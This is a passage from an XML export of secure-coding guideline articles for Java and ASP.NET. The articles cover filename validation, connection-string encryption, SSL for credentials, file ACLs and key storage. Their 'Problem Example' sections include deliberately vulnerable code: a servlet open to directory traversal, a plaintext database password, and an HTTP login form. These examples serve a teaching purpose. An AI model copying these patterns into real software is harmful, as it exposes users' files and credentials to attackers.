filesystem is case-sensitive.</strong> Always be sure&nbsp;that your application's filesystem is case-sensitive. Because most UNIX based operating systems have case-sensitive filesystems, <strong>FILE.DAT</strong> and <strong>file.dat</strong> represent&nbsp;two different files. However, Windows has a case-insensitive filesystem; therefore, <strong>FILE.DAT</strong> and <strong>file.dat</strong> represent the same file. If your application's filesystem is case-insensitive, make sure to specify the CASE_INSENSITIVE flag when using regular expressions to validate your file inputs. Example:</p><blockquote><pre>String goodPattern = "d:(<a>\\\\|/)myapp(\\\\|/)temp(\\\\|/)(\\w|\\s|\\.|-|){1,20</a>}";<br>Pattern p = Pattern.compile(goodPattern, Pattern.CASE_INSENSITIVE);</pre></blockquote></li><li><p><strong>Verify the filesystem's path delimiters.</strong> Verify the path delimiters that your application's filesystem uses and keep them consistent throughout the code. For example, Windows uses '<strong>\</strong>' or '<strong>/</strong>' to distinguish directories inside a path while UNIX based systems use only '<strong>/</strong>' to accomplish the same task.</p></li></ul></li></ol><h1>Problem Example</h1><p>The following code allows the user to read the contents of a report file, located in <strong>/myapp/temp/</strong>. Unfortunately, the code is missing filename validation; therefore, the application is exposed to a directory traversal attack:</p><blockquote><pre>import java.io.*;<br>import java.util.*;<br>import java.lang.*;<br>import javax.servlet.*;<br>import javax.servlet.http.*;<br> public final class ReportDownloader extends HttpServlet<br>{<br>      public void doGet(HttpServletRequest request,<br>            HttpServletResponse response) throws ServletException, IOException<br>      {<br>            response.setContentType("application/vnd.ms-excel");<br>            String baseDir = "/myapp/temp/";<br>            PrintWriter out = response.getWriter();<br>            String filename = request.getParameter("file");<br>            BufferedReader fin;<br>            String data = "";<br>             try<br>            {<br>                  File reportFile = new File(baseDir + filename);<br>                  // The application fails to validate the user-supplied filename<br>                  fin = new BufferedReader(new FileReader(reportFile));<br>                  StringBuilder sb = new StringBuilder();<br>                  while (data != null)<br>                  {<br>                        data = fin.readLine();<br>                        if (validateData(data))<br>                        {<br>                              sb.append(data);<br>                        }<br>                        else<br>                        {<br>                              // Add the appropriate logging and exception handling<br>                              // mechanisms. Consult the Exception Handling and<br>                              // Logging sections<br>                              out.println("We cannot handle your request at the moment."<br>                                        + "Please try again later.");<br>                              return;<br>                        }<br>                  }<br>                  out.println(sb.toString());<br>            }<br>            catch (Exception e)<br>            {<br>                  // Add the appropriate logging and exception handling mechanisms<br>                  // Consult the Exception Handling and Logging sections<br>                  out.println("We cannot handle your request at the moment."<br>                            + "Please try again later.");<br>            }<br>             out.flush();<br>             out.close();<br>      }<br>       boolean validateData(String input)<br>      {<br>             // Implement a validation routine for the format of the reports<br>      }<br>}</pre></blockquote><h1>Solution Example</h1><p>The following code allows the user to read the contents of a report file, located in <strong>/myapp/temp/</strong>. Since the filename is validated, an attacker cannot execute directory traversal attacks. </p><blockquote><pre>import java.io.*;<br>import java.util.*;<br>import java.lang.*;<br>import javax.servlet.*;<br>import javax.servlet.http.*;<br> public final class ReportDownloader extends HttpServlet<br>{<br>      public void doGet(HttpServletRequest request,<br>            HttpServletResponse response) throws ServletException, IOException<br>      {<br>            response.setContentType("application/vnd.ms-excel");<br>            String baseDir = "/myapp/temp/";<br>            PrintWriter out = response.getWriter();<br>            String filename = request.getParameter("file");<br>            BufferedReader fin;<br>            String data = "";<br>             try<br>            {<br>                  File reportFile = new File(baseDir + filename);<br>                   // The application validates the user-supplied filename<br>                              if (validateFilename(reportFile))<br>                  {                        fin = new BufferedReader(new FileReader(reportFile));<br>                        StringBuilder sb = new StringBuilder();<br>                        while (data != null)<br>                        {<br>                              data = fin.readLine();<br>                              if (validateData(data))<br>                              {<br><br>                                    sb.append(data);<br>                              }<br>                              else<br>                              {<br>                                    // Add the appropriate logging and exception<br>                                    // handling mechanisms. Consult the Exception<br>                                    // Handling and Logging sections<br>                                     out.println("We cannot handle your request at<br>                                               + "the moment. Please try again later.");<br>                                    return;<br>                              }<br>                        }<br>                        out.println(sb.toString());<br>                  }<br>                  else<br>                  {<br>                        // Add the appropriate logging and exception handling mechanisms<br>                        // Consult the Exception Handling and Logging sections<br>                        out.println("We cannot handle your request at the moment."<br>                                  + "Please try again later.");<br>                  }<br>            }<br>            catch (Exception e)<br>            {<br>                  // Add the appropriate logging and exception handling mechanisms<br>                  // Consult the Exception Handling and Logging sections<br>                   out.println("We cannot handle your request at the moment. "<br>                             + "Please try again later.");<br>            }<br>             out.flush();<br>            out.close();<br>      }<br>       boolean validateFilename(File file)<br>      {<br>            // This represents the format /myapp/temp/&lt;filename&gt;<br>            String goodPattern = "/myapp/temp/(\\w|\\s|\\.|-|){1,20}";<br>            Pattern p = Pattern.compile(goodPattern);<br>            Matcher m = p.matcher(file.getCanonicalPath());<br>            if (!m.matches())<br>            {<br>                  return false;<br>            }<br>            return true;<br>      }<br>       boolean validateData(String input)<br>      {<br>            // Implement a validation routine for the format of the reports<br>      }<br>}</pre></blockquote><h1>Additional Resources</h1><ul><li>For more information on handling files with Java, see: Documentation for <a href="http://download.oracle.com/javase/1.4.2/docs/api/java/io/File.html">Class File</a> in Java SDK.</li></ul><h1>Related Items</h1><ul><li><a href="ruledisplay:DA8CCFC9-F04F-4913-B05E-F574D3E4A559">Guideline: Validate Input for Length, Range, Format, and Type (Java Web Application)</a> </li><li><a href="ruledisplay:71225A92-ECA2-481E-ADEE-EA9C222DEA43">Guideline: Validate Input from All Sources (Java Web Application)</a> </li><li><a href="ruledisplay:D6593992-DC9E-42C5-9E98-30E8EF075B93">Guideline: Do Not Rely on Client-Side Validation (Java Web Application)</a> </li><li><a href="ruledisplay:C7AC7D00-4AEA-4AFA-AD2D-1E812664BA38">Attack: Canonicalization Attack</a> </li><li><a href="ruledisplay:044B9F0A-6A95-442C-BF24-3F890D0B10EF">Attack: Client-side Validation Attack</a> </li><li><a href="ruledisplay:42722D74-2F38-4B31-AC10-C9EC05DC7CC6">Attack: Alternate Data Streams Attack</a> </li><li><a href="ruledisplay:B9DD25F1-3C5C-40DD-A82E-464D0C02C14D">Attack: Command Injection Attack</a> </li><li><a href="ruledisplay:41BACAD4-8875-4F83-A9F6-C2263B23ABC4">Attack: File Name and Path Manipulation Attack</a> </li><li><a href="ruledisplay:351789B0-A694-4E05-9C05-1A53EF053AF7">Checklist Item: User-Supplied Filenames and Paths are Validated (Java Web Application)</a> </li></ul>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="-133452567" Content_Hash="1746014011">
    <Metadata>
      <Id>e2f1c054-0081-49c8-8555-f15a02a4bb2f</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>Encrypt Connection Strings</Title>
      <Category>Data Access</Category>
      <Phase>Deployment</Phase>
      <Technology>ASP.NET 3.5</Technology>
      <Type>Guideline</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority>2</Priority>
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>What to Do</h1><p>Do not store connection strings in plain text. Use a protected&nbsp;configuration provider such as the RSA Protected Configuration Provider or the Windows Data Protection API (DPAPI)&nbsp;to&nbsp;encrypt connection strings before&nbsp;storing them in configuration files. </p><h1>Why</h1><p>Connection strings contain sensitive resource access credentials such as user names, passwords and server names. Connection strings stored in plaintext are dangerous, because an attacker that can compromise a server will be able to read those connection strings. Even if a machine is not compromised, connection strings stored in plain text&nbsp;are accessible to administrators and any other users with sufficient privileges&nbsp;on the host machine and/or Windows domain.&nbsp;</p><h1>When</h1><p>Always encrypt connection strings. The Windows Data Protection API (DPAPI) is the default provider and is&nbsp;an acceptable choice under most circumstances. If&nbsp;an application is deployed&nbsp;within a Web farm environment,&nbsp;the RSA-protected configuration provider is a better choice because it uses asymmetric, public&nbsp;key encryption to encrypt and decrypt data keys that can easily be exported and imported across servers. If neither of these suffice, create a&nbsp;custom provider. </p><h1>How</h1><p>This section describes how to use DPAPI to encrypt connection strings. Please check the related guidelines for more information on using the RSA Protected Configuration Provider.&nbsp;</p><ol><li><p><strong>Choose the appropriate configuration provider.</strong> Under most circumstances DPAPI will suffice, although the RSA protected configuration is the logical choice in web farms where multiple servers are employed. </p></li><li><p><strong>Identify the configuration sections to be encrypted.</strong> Encrypting and decrypting data incurs performance overhead. To keep this overhead to a minimum, encrypt only the sections of the configuration file that store sensitive data.&nbsp; Encrypt the &lt;connectionStrings&gt; element of the Web.config file to protect the database connection string. </p></li><li><p><strong>Choose the machine or user store.</strong> The DataProtectionConfigurationProvider supports machine-level and user-level stores for key storage. The choice of store depends largely on whether or not&nbsp;the application shares a server with other applications and whether or not sensitive data must be kept private for each application.</p><ul><li><p><strong>Machine Store. </strong>By default, the DataProtectionConfigurationProvider is configured to use DPAPI with the machine store. Use machine-level key storage in the following situations:</p><ul><li>The application runs on its own dedicated server with no other applications. </li><li>Multiple applications run on the same server&nbsp;and&nbsp;those applications need to be able to share sensitive information.</li></ul><p>To encrypt the connectionStrings section&nbsp;with the Machine Store, run the following command from a .NET command prompt:</p><pre>   aspnet_regiis -pe "connectionStrings" -app "/MachineDPAPI" -prov "DataProtectionConfigurationProvider" </pre></li><li><p><strong>User Store. </strong>Use user-level key storage if the application runs in a shared hosting environment and the&nbsp;application's sensitive data should&nbsp;not be accessible to other applications on the server. In this situation, each application should run under a separate identity, and the resources for the application—such as files and databases—should be restricted to that identity.</p><p>To encrypt the connectionStrings section&nbsp;with the&nbsp;User Store, run the following command from a .NET command prompt:</p><pre>   aspnet_regiis -pe "connectionStrings" -app "/UserDPAPI" -prov "MyUserDataProtectionConfigurationProvider"</pre></li></ul></li><li><p><strong>Encrypt&nbsp;the configuration file data.</strong>&nbsp;To encrypt the connectionStrings section in Web.config using DPAPI with the Machine Store, run the following command from a .NET command prompt:</p><pre>   aspnet_regiis -pe "connectionStrings" -app "/MachineDPAPI" -prov "DataProtectionConfigurationProvider" </pre><p>The above command with the -app switch assumes that there is an IIS virtual directory called MachineDPAPI. If the Visual Studio .NET Web server is being utilized instead of IIS, use the -pef switch, which&nbsp;specifies the physical directory location of&nbsp;the configuration file.</p><pre>   aspnet_regiis.exe -pef "connectionStrings" C:\Projects\MachineDPAPI -prov "DataProtectionConfigurationProvider"&nbsp;&nbsp;&nbsp;&nbsp;</pre></li></ol><h1>Problem Example</h1><p>A web application is running in&nbsp;a hosted web environment. The application uses an SQL database instance and has sensitive data that should not be accessible to&nbsp;other applications on the same system.&nbsp;The web.config file contains a connectionString section that&nbsp;the application uses to access the SQL database:</p><pre>&lt;connectionStrings&gt;<br>  &lt;add name="MyLocalSQLServer"<br>        connectionString="Initial Catalog=pubs;User Id=sa;Password=asdasd;<br>       data source=localhost;Integrated Security=SSPI;"<br>       providerName="System.Data.SqlClient"/&gt;<br>&lt;/connectionStrings&gt;</pre><p>Unfortunately,&nbsp;anyone capable of reading the web.config file for the application is now able to see the database, the username, and the password for the database instance, and will be able to execute statements at the same level of privilege as the application.</p><h1>Solution Example</h1><p>A web application is running in&nbsp;a hosted web environment. The application uses an SQL database instance and has sensitive data that should not be accessible to&nbsp;other applications on the same system.&nbsp;The web.config file contains a connectionString section that&nbsp;the application uses to access the SQL database:</p><pre>&lt;connectionStrings&gt;<br>  &lt;add name="MyLocalSQLServer"<br>        connectionString="Initial Catalog=pubs;User Id=sa;Password=asdasd;<br>       data source=localhost;Integrated Security=SSPI;"<br>       providerName="System.Data.SqlClient"/&gt;<br>&lt;/connectionStrings&gt;</pre><p>During deployment the connectionStrings section of web.config as been encrypted with DataProtectionConfigurationProvider and DPAPI. This was accomplished with the following command:</p><pre>   aspnet_regiis -pe "connectionStrings" -app "/UserDPAPI" -prov "MyUserDataProtectionConfigurationProvider"</pre><p>The connection string has been encrypted, which can be verified by looking at the web.config file. There is no need to decrypt the file by hand, since ASP.NET handles this transparently.</p><p><br></p><h1>Additional Resources</h1><ul><li>Windows Data Protection <a href="http://msdn.microsoft.com/library/default.asp?url=/library/en-us/dnsecure/html/windataprotection-dpapi.asp">http://msdn.microsoft.com/library/default.asp?url=/library/en-us/dnsecure/html/windataprotection-dpapi.asp</a> </li><li>How to use the ASP.NET utility to encrypt credentials and session state connection strings <a href="http://support.microsoft.com/default.aspx?scid=kb;en-us;329290">http://support.microsoft.com/default.aspx?scid=kb;en-us;329290</a></li></ul><h1>Related Items</h1><ul><li><a href="ruledisplay:1fe40372-6648-4496-8552-794f91ff6bbf">Connection Strings are Secured</a> </li><li><a href="ruledisplay:760734bc-7080-4864-91ec-fd6db510f8ed">Credentials in SQL Connection Strings are Protected in Configuration Files</a> </li><li><a href="ruledisplay:e963466f-3c57-48a5-bdf9-1f66136c12d3">Use RSA-Protected Configuration Provider in Web Farm Environments</a></li></ul><hr><p>Adapted from Microsoft patterns &amp; practices guidance. </p>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="2019359695" Content_Hash="1463852557">
    <Metadata>
      <Id>e322d018-d2f1-4c5c-9c41-288b4b7155f1</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>Use SSL When Transmitting Credentials</Title>
      <Category>Authentication</Category>
      <Phase>Implementation</Phase>
      <Technology>Java</Technology>
      <Type>Guideline</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority>2</Priority>
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>Applies to</h1><ul><li>Applications written using Servlets or JSP.</li></ul><h1>What to Do</h1><p>Do not send credentials via unencrypted connections. Use SSL when transmitting credentials.</p><h1>Why</h1><p>Using SSL prevents the credentials from being sniffed or tampered with as they are transmitted over the network.</p><h1>When</h1><p>If your application sends credentials on the Internet.</p><h1>How</h1><p>Using Secure Socket Layer (SSL) over HTTP requires the following steps:</p><ol><li><p><strong>Create a certificate request.</strong> Using your hosting server or OpenSSL, generate an SSL certificate request. Example:</p><blockquote><pre># Generate private key<br>openssl genrsa -des3 -out privkey.pem 2048 <br># Generate certificate request using private key<br>openssl req -new -key privkey.pem -out cert.csr</pre></blockquote></li><li><p><strong>Present the request to a Certification Authority (CA).</strong> If all conditions for obtaining an SSL certificate are met, the CA will produce a new SSL certificate based on the certificate request. Because the requirements for obtaining an SSL certificate depend on the Certification Authority, consult with the Certification Authority in regards to the administrative steps necessary for obtaining such certificate.</p></li><li><p><strong>Install the certificate.</strong> Consult with the hosting server's documentation on how to install the SSL certificate.</p></li><li><p><strong>Ensure credentials are sent over SSL.</strong> Place the authentication portion of your application on a dedicated subdomain. Configure the server to accept only HTTPS traffic for the authentication subdomain. Ensure that form posts containing credentials are sent over HTTPS. This is accomplished by using absolute URL paths in the action field. Example:</p><blockquote><pre>&lt;form method="POST" action="https://login.example.com/myapp/login"&gt;</pre></blockquote></li></ol><h1>Problem Example</h1><p>In the following snippet, the credentials are transmitted over unprotected HTTP. This allows an attacker to easily steal credentials from sniffed traffic.</p><blockquote><pre>&lt;html&gt;<br>  &lt;head&gt;<br>    &lt;title&gt;login form&lt;/title&gt;<br>  &lt;/head&gt;<br>  &lt;body&gt;<br>    &lt;form method="POST" action="http://login.example.com/myapp/login"&gt;<br>    &lt;input type="text" name="user" size=25&gt;&lt;br&gt;<br>    &lt;input type="password" name="pass" size=25&gt;&lt;br&gt;<br>    &lt;input type="submit" name="submit" value="log in"&gt;<br>    &lt;/form&gt;<br>  &lt;/body&gt;<br>&lt;/html&gt;</pre></blockquote><h1>Solution Example</h1><p>In the following snippet, the credentials are transmitted over HTTPS. This makes it difficult for an attacker to steal credentials from sniffed traffic:</p><blockquote><pre>&lt;html&gt;<br>  &lt;head&gt;<br>    &lt;title&gt;login form&lt;/title&gt;<br>  &lt;/head&gt;<br>  &lt;body&gt;<br>    &lt;form method="POST" action="https://login.example.com/myapp/login"&gt;<br>    &lt;input type="text" name="user" size=25&gt;&lt;br&gt;<br>    &lt;input type="password" name="pass" size=25&gt;&lt;br&gt;<br>    &lt;input type="submit" name="submit" value="log in"&gt;<br>    &lt;/form&gt;<br>  &lt;/body&gt;<br>&lt;/html&gt;</pre></blockquote><h1>Additional Resources</h1><ul><li>For more information about using SSL in the J2EE, see: <a href="http://www.cs.uccs.edu/~cs301/j2ee/j2eetutorial14/doc/Security6.html">Installing and Configuring SSL Support</a>. </li><li>To learn more about generating certificate requests, see: <a href="http://support.microsoft.com/default.aspx?scid=KB;en-us;q228821">Generating a Certificate Request File Using the Certificate Wizard in IIS 5.0</a>. </li><li>To learn more about creating SSL certificates, see: <a href="http://www.openssl.org/docs/HOWTO/certificates.txt">OpenSSL HOWTO certificates</a>. </li><li>For more information about using SSL with Tomcat, see: <a href="http://tomcat.apache.org/tomcat-4.0-doc/ssl-howto.html">SSL Configuration HOW-TO</a>.</li></ul><h1>Related Items</h1><ul><li><a href="ruledisplay:024B6044-7C89-436C-8111-1B6FAE7298AC">Guideline: Protect Sensitive Data Over the Network (Java Web Application)</a> </li><li><a href="ruledisplay:F0E2BFFC-E6D1-4DC6-A6C2-D078F54AE10E">Guideline: Protect Session Cookies (Java Web Application)</a> </li><li><a href="ruledisplay:B47A6486-A73E-44B9-AD17-1F7F94199828">Attack: Network Credential Sniffing Attack</a> </li><li><a href="ruledisplay:9E3FC30A-B55C-4AF6-8B77-A534C6F87197">Attack: Phishing Attack</a> </li><li><a href="ruledisplay:4572037A-2166-4AD1-8E73-D623E468A7B9">Attack: Information Disclosure Attack</a> </li><li><a href="ruledisplay:B446B34C-8DEC-4F74-A392-C30D1719D90D">Attack: Trust Relationship Attack</a> </li><li><a href="ruledisplay:48BB4D3A-9295-4263-B3E7-090E483DEC5D">Attack: Man in the Middle Attack</a> </li><li><a href="ruledisplay:51CDBB59-211B-4816-896D-319D42D3FCE2">Checklist Item: SSL is Used When Transmitting Credentials (Java Web Application)</a> </li></ul>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="1406284764" Content_Hash="100732046">
    <Metadata>
      <Id>e800cb23-11ca-4cdf-babb-19d8f8c0e955</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>Partition Application Between Public and Private Domains</Title>
      <Category>Authentication</Category>
      <Phase>Deployment</Phase>
      <Technology>Java</Technology>
      <Type>Guideline</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority>2</Priority>
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>Applies to</h1><ul><li>Applications written using Servlets or JSP.</li></ul><h1>What to Do</h1><p>Define a boundary between public and restricted content.</p><h1>Why</h1><p>Defining a boundary between public and restricted content helps establish the check points&nbsp;where access will be allowed&nbsp;to the restricted content.</p><h1>When</h1><p>If your application has access control that&nbsp;restricts certain users to specific resources, then define a boundary between those resources. For instance, anonymous users are restricted&nbsp;to one part of the application, while&nbsp;authenticated users can access both parts.</p><h1>How</h1><p>Defining the boundary requires:</p><ol><li><p><strong>Determine roles. </strong>Define the various types of users and their rights. Build a security policy for the restricted content and base the user groups' privileges around it. </p></li><li><p><strong>Define the boundary. </strong>Structure the content according to access and logical orders. Try to use a modular approach when establishing the boundary. </p></li><li><p><strong>Separate on disk. </strong>Once the boundaries have been established, reflect these boundaries onto the local file system. Separate the restricted content from the public content on disk. </p></li><li><p><strong>Set proper permissions. </strong>Set proper permissions to the restricted content. Dedicate a special directory for the restricted content and require valid access before accessing content within this directory. These permissions can be enforced at the application, server and operating system levels, depending on the environment in use.</p></li></ol><h1>Problem Example</h1><p>MyApp is a financial tool that generates reports based on sensitive data. It allows the user to upload the financial data and download the report. Since the application is small, all of its content is located within the same directory. The access control is enforced by the web application through checking the required permissions before a given call is executed.</p><p>Since both data and code is within the same directory, it may be possible for an attacker to gain access to the raw financial data.</p><h1>Solution Example</h1><p>MyApp is a financial tool that generates reports based on some sensitive data. It allows the user to upload the financial data and download the report. The application has a dedicated <strong>/data/</strong> directory for the financial data. Access to contents within the <strong>/data/</strong> directory is handled by the server hosting MyApp, making it much more difficult for an unauthorized user to gain access.</p><h1>Related Items</h1><ul><li><a href="ruledisplay:31529619-FB94-4798-BB29-14AC389F2240">Guideline: Separate Account Administration from the Main Application Interface (Java Web Application)</a> </li><li><a href="ruledisplay:2A2791FA-47DB-4528-9EEC-03482142AABF">Guideline: Perform Role-Based Security Checks (Java Web Application)</a> </li><li><a href="ruledisplay:1131DE2A-C216-4397-97C8-A8D33DE8CC51">Guideline: Define a Security Policy (Java Web Application)</a> </li><li><a href="ruledisplay:EAD019CA-025A-4DC6-A4DC-6DFDC9FBA131">Guideline: Disable Directory Browsing (Java Web Application)</a> </li><li><a href="ruledisplay:1D7F6072-1A5F-472E-9D27-F15E396EAB2E">Attack: Forceful Browsing Attack</a> </li><li><a href="ruledisplay:597D8E4A-B05B-451B-B894-911F354B860A">Checklist Item: Application is Partitioned into Public and Private Domains (Java Web Application)</a> </li></ul>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="-1972133755" Content_Hash="-679210286">
    <Metadata>
      <Id>e992dbe8-7076-4983-945f-67f4bb91c47e</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>Configure Appropriate ACLs on Web Site Files</Title>
      <Category>Authorization</Category>
      <Phase>Deployment</Phase>
      <Technology>ASP.NET 3.5</Technology>
      <Type>Guideline</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority>2</Priority>
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>What to Do</h1><p>Configure access control lists (ACLs) on your Web site files so that IIS and ASP.NET file authorization appropriately control access to these files.&nbsp;&nbsp; </p><h1>Why</h1><p>Failure to apply proper&nbsp;access control restrictions on files&nbsp;may allow users&nbsp;to read, edit,&nbsp;or remove files they should not be able to.&nbsp;ACLs are an important layer of defense against unauthorized file&nbsp;access.&nbsp;</p><h1>When</h1><p>All ASP.NET applications can benefit from appropriate file ACLs.&nbsp;ACLs should be established&nbsp;in the&nbsp;design&nbsp;phase, prior to&nbsp;implementing the application.&nbsp;The&nbsp;ACLs&nbsp;are applied at deploy time.&nbsp;</p><h1>How</h1><p>You need to configure the right access control lists (ACLs) for the right identities on your Web site files so that IIS and also ASP.NET file authorization control access to these files appropriately. You need to grant access to the following identities: </p><ol><li><p><strong>Your Web application identity.</strong> If you are using a custom service account to run your ASP.NET application, you can grant the appropriate permissions to the IIS metabase and to the file system by running Aspnet_regiis.exe with the-<strong>ga</strong> switch. </p></li><li><p><strong>Your application's users.</strong> ASP.NET file authorization performs access checks for file types mapped by IIS to the ASP.NET ISAPI extension (Aspnet_isapi.dll). If you are using Windows authentication, the authenticated user's Windows access token (which may be IUSR_MACHINE for anonymous users) is checked against the ACL attached to the requested ASP.NET file. If you are using forms authentication, access is checked against IUSR_MACHINE.</p></li></ol><p>Use the following steps:</p><ol><li><p><strong>Determine the users/roles that need to access the application's resources.</strong> Create a list of all roles in the application.&nbsp;The Web application's process&nbsp;identity and the application's users are the entities that&nbsp;require access to application resources. If&nbsp;a custom service account is being utilised to run&nbsp;the ASP.NET application be sure to list it as well, it will need the appropriate permissions to the IIS metabase and the file system.&nbsp;</p></li><li><p><strong>Evaluate the level of access each user/role should have to use the application resources.</strong> It is important to assign the minimum privilege level for all entities that access resources.&nbsp; To do this create a table that contains roles on one axis and resources on another.&nbsp; Within the&nbsp;matrix cells describe the level of access each role will need for each resource (eg. Read Only, Read/Write, Full Access, etc.).&nbsp; This is commonly called a subject/object matrix:</p><p><table><tbody><tr><td></td><td><strong>Objects</strong></td><td></td></tr><tr><td><strong>Subjects</strong></td><td><strong>User Administration</strong></td><td><strong>Page Content</strong></td></tr><tr><td><strong>Admin</strong></td><td>Create, Delete, Modify</td><td></td></tr><tr><td><strong>Content Creator</strong></td><td></td><td>Create, Delete, Modify, Read</td></tr><tr><td><strong>Reader</strong></td><td></td><td>Read</td></tr><tr><td><strong>Anonymous</strong></td><td></td><td>Read</td></tr></tbody></table></p></li><li><p><strong>Apply ACLs to enforce these restrictions.</strong> To assign ASP.NET permissions to the&nbsp;application's account, run the following command:</p><pre>aspnet_regiis -ga MachineName\AccountName </pre><p>Where MachineName is the name of your server or the domain name if you are using a domain account, and AccountName is the name of your custom account. When you run Aspnet_regiis.exe with the -ga switch, the command grants the following rights to the account:</p><ul><li><div>Access to the IIS Metabase</div></li><li><div>Permission to write to the %Windir%\Microsoft.NET\Framework\version\Temporary ASP.NET Files folder</div></li></ul><p>The account is also a member of the local Users group; therefore, it has read access to the \Inetpub directory tree (these directories have an ACL that grants read access to the Users group).&nbsp;</p></li></ol><h1>Additional Resources</h1><ul><li><div>An Introduction to the IIS Metabase <a href="http://support.microsoft.com/kb/240941/en-us">http://support.microsoft.com/kb/240941/en-us</a></div></li></ul><h1>Related Rules</h1><ul><li><div><a href="ruledisplay:bdff2308-96e1-4787-9162-a115d1366f76">Block Protected Files from being Retrieved</a></div></li><li><div><a href="ruledisplay:0def44d6-fea1-45a9-951c-79b54d549e5c">Restrict Access to Audit and Log Files</a></div></li></ul><hr><p>Adapted from Microsoft patterns &amp; practices guidance. </p>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="1713111659" Content_Hash="-1670071902">
    <Metadata>
      <Id>eb4c2562-d306-4aa0-a86c-630c5cdff1c6</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>Restrict Authentication Cookies to HTTPS Connections</Title>
      <Category>Authentication</Category>
      <Phase>Implementation</Phase>
      <Technology>ASP.NET 3.5</Technology>
      <Type>Guideline</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority>2</Priority>
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>What to Do</h1><p>Use the <strong>requireSSL</strong> attribute to restrict authentication cookies to HTTPS connections only. </p><h1>Why</h1><p>Sending cookies out exclusively over SSL makes it much harder for an attacker to sniff the cookie values off the wire.&nbsp; If an attacker can get a copy of an authentication cookie, they can potentially emulate that user, compromising their account. </p><h1>When</h1><p>All systems which use authentication cookies should use SSL for those cookies if possible.&nbsp; Systems which deal with any personally identifiable information or monetary transaction should use SSL in all circumstances without exception. </p><h1>How</h1><p>Set the <strong>secure</strong> property of the authentication cookie to ensure that browsers only send authentication cookies over HTTPS connections.&nbsp; By using SSL, you prevent an attacker from capturing the authentication cookie to gain spoofed access to your application.&nbsp; Set the <strong>secure</strong> property by using <strong>requireSSL="true"</strong> on the <strong>&lt;forms&gt;</strong> element as shown here. </p><pre>&lt;forms loginUrl="Secure\Login.aspx"<br>        requireSSL="true" ... /&gt;</pre><h1>Problem Example</h1><p>An online brokerage provides a large amount of reference content.&nbsp; As this content is not specific to any user and is publicly available, it is not protected by SSL for performance reasons like the trading interface is.&nbsp; However, the site is not configured to restrict authentication cookies to SSL only, so they're sent with all requests.&nbsp; An attacker positions themself on the same network segment as a user (someone using the public network in an internet cafe), sniffs the user's traffic, steals their cookie, and uses it to access their accounts.</p><h1>Solution Example</h1><p>An online brokerage provides a large amount of reference content.&nbsp; As this content is not specific to any user and is publicly available, it is not protected by SSL for performance reasons like the trading interface is.&nbsp; The site is&nbsp;correctly configured to restrict authentication cookies to SSL only, so they're only sent with requests protected by SSL.&nbsp; An attacker positions themself on the same network segment as a user (someone using the public network in an internet cafe) and sniffs the user's traffic, but because the cookies are only sent via SSL, they cannot retrieve them.</p><hr><p>Adapted from Microsoft patterns &amp; practices guidance. </p>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="2070668630" Content_Hash="842552901">
    <Metadata>
      <Id>f12d5701-d706-47af-8c14-eaeeb4fad8e3</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>Use a Secure Key Storage Location</Title>
      <Category>Deployment Considerations</Category>
      <Phase>Implementation</Phase>
      <Technology>Java</Technology>
      <Type>Guideline</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority>2</Priority>
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>Applies to</h1><ul><li>Applications written using Servlets or JSP.</li></ul><h1>What to Do</h1><p>Application keys should be stored in a well defined location, such as the Java KeyStore. Do not hard code them or store them as plaintext inside configuration files or source code.</p><h1>Why</h1><p>When faced with encryption, intruders attack the most vulnerable aspect: key management. Because keys are used to generate the encryption that protects sensitive data, the keys themselves become sensitive data that needs to be protected.</p><h1>When</h1><p>If your application uses encryption and encryption keys, use a secure storage location for the keys.</p><h1>How</h1><p>When considering a key storage location:</p><ol><li><p><strong>Identify the need for a key store. </strong>Key stores should be used when your application utilizes crypto keys. Example:</p><blockquote><pre>KeyGenerator kgen = KeyGenerator.getInstance("AES");<br>kgen.init(256);SecretKey skey = kgen.generateKey();<br>byte[] rawKey = skey.getEncoded();<br> SecretKeySpec skeySpec = new SecretKeySpec(rawKey, "AES");</pre></blockquote></li><li><p><strong>Use Java's KeyStore class. </strong>Since version 1.2, Java offers a key store functionality as part of the Java Runtime Environment. The Java key store requires a master password for retrieving the contents of the key store. The master password should be given to the application at starting time. Use the KeyTool utility to create and manage the keys inside the key store. Example of accessing the key store:</p><blockquote><pre>String keyStoreName = MyApp.getKeyStoreName();<br>char[] keyStorePass = MyApp.getKeyStorePass();<br> KeyStore keyStore = KeyStore.getInstance(KeyStore.getDefaultType());<br>FileInputStream keyStoreFile = new FileInputStream(keyStoreName);<br>keyStore.load(keyStoreFile, keyStorePass);<br>keyStoreFile.close();<br> final String keyName = "MyAppEncryptionKey";<br>// Note: Although the example uses the same password for storing the KeyStore<br>// on disk 